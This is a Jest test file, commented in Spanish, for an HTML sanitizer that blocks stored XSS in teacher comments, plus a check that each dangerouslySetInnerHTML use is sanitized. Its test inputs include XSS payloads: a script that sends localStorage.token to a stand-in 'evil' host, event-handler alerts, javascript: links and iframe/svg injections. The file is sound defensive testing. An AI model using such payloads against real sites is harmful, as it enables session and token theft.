/**
 * H12 (OWASP A03, XSS almacenado): las observaciones que escribe el docente se muestran con
 * dangerouslySetInnerHTML. Oráculo: solo sobreviven etiquetas de formato, sin atributos.
 */
import fs from 'fs';
import path from 'path';
import { sanitizeHtml } from './sanitizeHtml';

describe('sanitizeHtml', () => {
    it('conserva el formato básico', () => {
        expect(sanitizeHtml('<p>Muy <b>bien</b> <em>hecho</em></p>')).toBe('<p>Muy <b>bien</b> <em>hecho</em></p>');
    });

    it('elimina <script> con su contenido', () => {
        const out = sanitizeHtml('<p>ok</p><script>fetch("//evil?"+localStorage.token)</script>');
        expect(out).toBe('<p>ok</p>');
    });

    it('quita atributos peligrosos (on*, style, href javascript:, src)', () => {
        const out = sanitizeHtml('<span onclick="alert(1)" style="x">a</span><a href="javascript:alert(2)">b</a><img src=x onerror=alert(3)>');
        expect(out).not.toMatch(/onclick|onerror|style=|javascript:|<img|<a /i);
        expect(out).toContain('<span>a</span>');
        expect(out).toContain('b');
    });

    it('descarta iframes y svg con su contenido', () => {
        expect(sanitizeHtml('<iframe src="//evil"></iframe><svg onload="alert(1)"><circle/></svg>texto')).toBe('texto');
    });

    it('devuelve cadena vacía para null/undefined/vacío', () => {
        expect(sanitizeHtml(null)).toBe('');
        expect(sanitizeHtml(undefined)).toBe('');
        expect(sanitizeHtml('')).toBe('');
    });
});

describe('uso de dangerouslySetInnerHTML en src/', () => {
    const srcDir = path.join(__dirname, '..');

    function jsFiles(dir) {
        return fs.readdirSync(dir, { withFileTypes: true }).flatMap((e) => {
            const full = path.join(dir, e.name);
            if (e.isDirectory()) return jsFiles(full);
            return /\.jsx?$/.test(e.name) && !/\.test\.jsx?$/.test(e.name) ? [full] : [];
        });
    }

    it('todo dangerouslySetInnerHTML pasa el contenido por sanitizeHtml', () => {
        const offenders = [];
        jsFiles(srcDir).forEach((file) => {
            fs.readFileSync(file, 'utf8').split('\n').forEach((line, i) => {
                const m = line.match(/dangerouslySetInnerHTML=\{\{\s*__html:\s*([^}]*)\}\}/);
                if (m && !/^\s*sanitizeHtml\(/.test(m[1])) {
                    offenders.push(`${path.relative(srcDir, file)}:${i + 1}`);
                }
            });
        });
        expect(offenders).toEqual([]);
    });
});
